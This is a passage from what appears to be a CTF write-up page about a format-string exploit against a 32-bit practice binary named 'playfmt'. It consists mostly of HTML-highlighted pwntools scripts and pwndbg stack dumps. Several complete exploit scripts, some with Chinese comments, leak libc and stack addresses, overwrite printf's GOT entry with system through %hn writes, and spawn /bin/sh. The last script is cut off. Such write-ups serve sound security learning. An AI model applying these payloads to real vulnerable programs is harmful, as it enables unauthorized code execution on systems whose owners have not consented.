◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'17:005c│      0xffa0781c ◂— 0x0... ↓'''</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> <span class="token string">"b *do_fmt+64\nc"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"..%8$p....%6$p..11111111\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>success<span class="token punctuation">(</span><span class="token string">"libc.address -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span>stack <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x28</span>success<span class="token punctuation">(</span><span class="token string">"stack -> {:#x}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%30684c%21$hn%1"...0x804a06f &lt;buf+15>:    "6c%22$hn2222222"...0x804a07e &lt;buf+30>:    "2"pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x36303325 ('%306')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa083d6 ◂— './playfmt'16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa083e0 ◂— 'NO_AT_BRIDGE=1'17:005c│      0xffa0781c ◂— 0x0... ↓'''</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>stack <span class="token operator">+</span> <span class="token number">0x1c</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((stack + 0x2c) &amp; 0xffff - (stack + 0x1c) &amp; 0xffff, 0x16)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'22222222\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"11111111"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%40976c%57$hn%2"...0x804a06f &lt;buf+15>:    "c%59$hn33333333"0x804a07e &lt;buf+30>:    ""pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x39303425 ('%409')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x8048584 (play+59) ◂— nop16:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop17:005c│      0xffa0781c ◂— 0x0... ↓'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#  payload += "%{}c%{}$hn".format((elf.got['printf'] &amp; 0xffff + 2) - (elf.got['printf'] &amp; 0xffff), 0x3b)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"33333333\0"</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"22222222"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "%211c%11$hhn%31"...0x804a06f &lt;buf+15>:    "325c%7$hn444444"...0x804a07e &lt;buf+30>:    "44"pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d46930 (printf) ◂— call   0xf7e1dae908:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d40c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d4693016:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d417:005c│      0xffa0781c ◂— 0x0... ↓pwndbg> n0x08048540 in do_fmt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────[ REGISTERS ]──────────────────────── EAX  0x7b38 EBX  0x0 ECX  0xffa052a0 ◂— 0x20202020 ('    ') EDX  0xf7eb1870 (_IO_stdfile_1_lock) ◂— 0x0 EDI  0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db0 ESI  0x1 EBP  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x0 ESP  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211') EIP  0x8048540 (do_fmt+69) ◂— add    esp, 0x10─────────────────────────[ DISASM ]──────────────────────────   0x804853b &lt;do_fmt+64>    call   printf@plt &lt;0x80483a0> ► 0x8048540 &lt;do_fmt+69>    add    esp, 0x10   0x8048543 &lt;do_fmt+72>    jmp    do_fmt+6 &lt;0x8048501>    ↓   0x8048501 &lt;do_fmt+6>     sub    esp, 4   0x8048504 &lt;do_fmt+9>     push   0xc8   0x8048509 &lt;do_fmt+14>    push   buf &lt;0x804a060>   0x804850e &lt;do_fmt+19>    push   0   0x8048510 &lt;do_fmt+21>    call   read@plt &lt;0x8048390>   0x8048515 &lt;do_fmt+26>    add    esp, 0x10   0x8048518 &lt;do_fmt+29>    sub    esp, 4   0x804851b &lt;do_fmt+32>    push   4──────────────────────────[ STACK ]──────────────────────────00:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc────────────────────────[ BACKTRACE ]──────────────────────── ► f 0  8048540 do_fmt+69   f 1  804a010 _GLOBAL_OFFSET_TABLE_+16   f 2 f7eb0d60 _IO_2_1_stdout_   f 3  804a012 _GLOBAL_OFFSET_TABLE_+18   f 4 f7eb03dc __exit_funcs   f 5 ffa07810   f 6 f7d15276 __libc_start_main+246pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x31313225 ('%211')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0xf7d37b30 (system) ◂— sub    esp, 0xc08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d30c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 ◂— 0x115:0054│      0xffa07814 —▸ 0xffa078a4 —▸ 0xffa077dc —▸ 0x804a010 (_GLOBAL_OFFSET_TABLE_+16) ◂— 0xf7d37b3016:0058│      0xffa07818 —▸ 0xffa078ac —▸ 0xffa077ec —▸ 0x804a012 (_GLOBAL_OFFSET_TABLE_+18) ◂— 0xc870f7d317:005c│      0xffa0781c ◂— 0x0... ↓pwndbg> gotGOT protection: Partial RELRO | GOT functions: 6[0x804a00c] read@GLIBC_2.0 -> 0xf7dd3c50 (read) ◂— cmp    dword ptr gs:[0xc], 0[0x804a010] printf@GLIBC_2.0 -> 0xf7d37b30 (system) ◂— sub    esp, 0xc[0x804a014] puts@GLIBC_2.0 -> 0xf7d5c870 (puts) ◂— push   ebp[0x804a018] __libc_start_main@GLIBC_2.0 -> 0xf7d15180 (__libc_start_main) ◂— push   ebp[0x804a01c] setvbuf@GLIBC_2.0 -> 0xf7d5cff0 (setvbuf) ◂— push   ebp[0x804a020] strncmp@GLIBC_2.0 -> 0xf7e3a5d0 (__strncmp_sse4_2) ◂— push   ebp'''</span><span class="token comment" spellcheck="true">#  gdb.attach(io, "b *do_fmt+64\nc")</span>payload <span class="token operator">=</span> <span class="token string">"%{}c%{}$hhn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"%{}c%{}$hn"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">>></span> <span class="token number">16</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x7</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">'44444444\0'</span>info<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"33333333"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"44444444"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh\0"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true">#作者：23R3F</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./playfmt'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>  printf_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>  p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"**********leak printf_got************"</span><span class="token punctuation">)</span> payload <span class="token operator">=</span> <span class="token string">'%6$x'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>ebp1 <span class="token operator">=</span> ebp2 <span class="token operator">-</span> <span class="token number">0x10</span>fmt_7 <span class="token operator">=</span> ebp2 <span class="token operator">-</span><span class="token number">0x0c</span>fmt_11 <span class="token operator">=</span> ebp2 <span class="token operator">+</span> <span class="token number">0x04</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"printf_got-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_1-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp1<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"ebp_2-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>ebp2<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_7-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_7<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"fmt_11-->p[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>fmt_11<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_7 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_7</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#由于ebp2已经指向了fmt_7，所以修改偏移量10处的ebp2即修改fmt_7</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>printf_got <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_7 = prinf_got</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token triple-quoted-string string">'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“23r3f”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''</span> payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>fmt_11 <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%6$hn'</span><span class="token comment" spellcheck="true">#ebp2 = fmt_11</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%10$hn'</span><span class="token comment" spellcheck="true">#fmt_11 = prinf_got + 2</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"******leaking the print_got_add*********"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'aaaa%7$s'</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span>printf_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"print_got_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>printf_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> printf_addr <span class="token operator">-</span> printf_libc <span class="token operator">+</span> system_libclog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_add is:[%s]"</span><span class="token operator">%</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>payload <span class="token operator">=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%7$hn'</span>payload <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>system_addr<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>system_addr <span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'c%11$hn'</span><span class="token triple-quoted-string string">'''这里需要注意的是，我们把system的地址的前后两个字节分别写到fmt-7和fmt-11中，在写入后两个字节的时候要注意减去前面输入的(system_addr &amp;0xffff))，这是因为%n写入操作是算累积输入的字符个数'''</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"23r3f"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''这个时候输入参数到栈中，本来下一步程序会调用printf函数，但是此时printf函数的got表已经被修改为system的地址了，此时就会执行system并且从栈中取bin/sh参数于是就这样getshell'''</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#veritas501 --exp</span><span class="token comment" spellcheck="true">#coding = utf8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'terminator'</span><span class="token punctuation">,</span><span class="token string">'-x'</span><span class="token punctuation">,</span><span class="token string">'bash'</span><span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>p_printf <span class="token operator">=</span> <span class="token number">0x0804A010</span>libc <span class="token operator">=</span> ELF<span class="token 